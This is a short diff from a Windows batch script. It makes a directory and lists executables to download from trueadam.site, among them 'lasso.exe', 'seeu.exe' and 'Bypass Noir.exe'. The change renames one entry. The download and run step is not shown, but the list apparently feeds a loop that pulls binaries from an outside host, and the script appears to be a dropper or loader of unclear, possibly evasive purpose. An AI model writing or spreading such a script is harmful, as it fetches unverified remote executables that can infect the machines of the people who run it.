@@ -7,7 +7,7 @@ mkdir "%DIR%" 2>nul
 cd /d "%DIR%"
 
 for %%A in (
-  "segtoy.exe|https://trueadam.site/segtoy.exe"
+  "machine.exe|https://trueadam.site/machine.exe"
   "lasso.exe|https://trueadam.site/lasso.exe"
   "seeu.exe|https://trueadam.site/seeu.exe"
   "Bypass Noir.exe|https://trueadam.site/Bypass%20Noir.exe"
